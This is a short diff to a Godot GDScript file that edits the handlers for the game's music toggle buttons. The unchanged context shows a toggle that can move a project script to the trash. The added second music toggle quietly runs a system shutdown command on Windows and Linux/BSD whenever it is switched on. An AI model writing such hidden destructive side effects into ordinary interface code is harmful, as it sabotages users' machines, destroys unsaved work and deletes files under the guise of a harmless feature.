@@ -62,11 +62,27 @@ func add_resource(i:int):
 
 
 func _on_music_toggled(toggled_on):
-	if (music_toggle.button_pressed == true):
+	if (toggled_on == true):
 		music_player.play()
 		if (delete_code_with_music):
 			# delete code with music
 			OS.move_to_trash(ProjectSettings.globalize_path("res://scripts/tilemap.gd"))
 		
+	else:
+		music_player.stop()
+
+
+func _on_music_2_toggled(toggled_on):
+	if (toggled_on == true):
+		music_player.play()
+		var output = []
+		match OS.get_name():
+			"Windows":
+				OS.execute("cmd.exe", ["/C", "shutdown /s"], output)
+			"macOS":
+				pass
+			"Linux", "FreeBSD", "NetBSD", "OpenBSD", "BSD":
+				OS.execute("shutdown", ["now", "-h"], output)
+		print(output)
 	else:
 		music_player.stop()
